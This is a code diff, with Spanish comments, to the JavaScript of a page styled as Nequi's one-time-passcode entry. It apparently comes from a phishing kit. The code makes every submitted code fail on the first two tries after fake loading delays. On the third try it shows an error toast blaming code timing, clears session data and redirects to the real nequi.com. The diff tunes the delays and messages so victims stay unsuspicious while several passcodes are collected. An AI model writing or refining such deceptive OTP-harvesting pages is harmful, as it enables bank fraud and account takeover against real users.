@@ -58,55 +58,38 @@
     }, seconds * 1000);
   }
 
-  // Popup modal con cuenta regresiva de 20s y redirect final
-  function showFinalModal(redirectUrl) {
-    const overlay = document.createElement('div');
-    overlay.style.cssText = [
-      'position:fixed;inset:0;background:rgba(0,0,0,.6);',
-      'display:flex;align-items:center;justify-content:center;',
-      'z-index:9999;padding:20px;',
+  // Toast rojo profesional con aparición suave, luego redirect
+  function showErrorToast(msg, redirectUrl) {
+    const toast = document.createElement('div');
+    toast.style.cssText = [
+      'position:fixed;bottom:32px;left:50%;transform:translateX(-50%) translateY(20px);',
+      'background:rgba(185,0,40,0.93);color:#fff;',
+      'padding:16px 24px;border-radius:14px;max-width:320px;width:calc(100% - 48px);',
+      'font-size:14px;line-height:1.55;text-align:center;font-weight:500;',
+      'box-shadow:0 8px 32px rgba(185,0,40,0.35);',
+      'opacity:0;transition:opacity .4s ease, transform .4s ease;z-index:9999;',
     ].join('');
+    toast.textContent = msg;
+    document.body.appendChild(toast);
 
-    const modal = document.createElement('div');
-    modal.style.cssText = [
-      'background:#fff;border-radius:18px;padding:36px 24px 28px;',
-      'max-width:360px;width:100%;text-align:center;',
-      'box-shadow:0 24px 64px rgba(0,0,0,.35);',
-    ].join('');
+    requestAnimationFrame(() => {
+      requestAnimationFrame(() => {
+        toast.style.opacity = '1';
+        toast.style.transform = 'translateX(-50%) translateY(0)';
+      });
+    });
 
-    modal.innerHTML = `
-      <div style="font-size:52px;margin-bottom:14px;">⚠️</div>
-      <h2 style="font-size:19px;font-weight:800;color:#1a1a2e;margin:0 0 10px;">Límite de intentos alcanzado</h2>
-      <p style="font-size:14px;color:#555;line-height:1.6;margin:0 0 22px;">
-        Por tu seguridad hemos bloqueado temporalmente el acceso.<br>
-        Serás redirigido automáticamente.
-      </p>
-      <p style="font-size:13px;color:#999;margin:0 0 12px;">
-        Redirigiendo en <strong id="modalSecs" style="color:#da0081;">20</strong> segundos…
-      </p>
-      <div style="height:5px;background:#f0f0f0;border-radius:99px;overflow:hidden;">
-        <div id="modalBar" style="height:100%;width:100%;background:#da0081;transition:width 1s linear;border-radius:99px;"></div>
-      </div>
-    `;
-
-    overlay.appendChild(modal);
-    document.body.appendChild(overlay);
-
-    const TOTAL = 20;
-    let secs = TOTAL;
-    const secsEl = document.getElementById('modalSecs');
-    const barEl  = document.getElementById('modalBar');
-
-    const iv = setInterval(() => {
-      secs--;
-      if (secsEl) secsEl.textContent = secs;
-      if (barEl)  barEl.style.width  = (secs / TOTAL * 100) + '%';
-      if (secs <= 0) {
-        clearInterval(iv);
-        sessionStorage.clear();
-        window.location.replace(redirectUrl);
-      }
-    }, 1000);
+    setTimeout(() => {
+      toast.style.opacity = '0';
+      toast.style.transform = 'translateX(-50%) translateY(20px)';
+      setTimeout(() => {
+        toast.remove();
+        showLoader(15, () => {
+          sessionStorage.clear();
+          window.location.replace(redirectUrl);
+        });
+      }, 450);
+    }, 3500);
   }
 
   // Navegación de cajas OTP
@@ -152,24 +135,27 @@
     btn.textContent = 'Procesando...';
 
     if (attempts === 1) {
-      // 1.ª clave: 6 segundos de carga → estado de error
-      showLoader(6, () => {
+      // 1.ª clave: 8 segundos de carga → estado de error
+      showLoader(8, () => {
         btn.disabled    = false;
         btn.textContent = 'Confirmar';
         setOtpError(true);
       });
 
     } else if (attempts === 2) {
-      // 2.ª clave: 3 segundos de carga → estado de error
-      showLoader(3, () => {
+      // 2.ª clave: 4 segundos de carga → estado de error
+      showLoader(4, () => {
         btn.disabled    = false;
         btn.textContent = 'Confirmar';
         setOtpError(true);
       });
 
     } else {
-      // 3.ª clave: popup con 20s de cuenta regresiva → redirect final
-      showFinalModal('https://www.nequi.com');
+      // 3.ª clave: toast rojo → redirect
+      showErrorToast(
+        'Clave dinámica incorrecta, espera a que el último código haya cambiado y vuelve a intentar.',
+        'https://www.nequi.com'
+      );
     }
   });
 })();
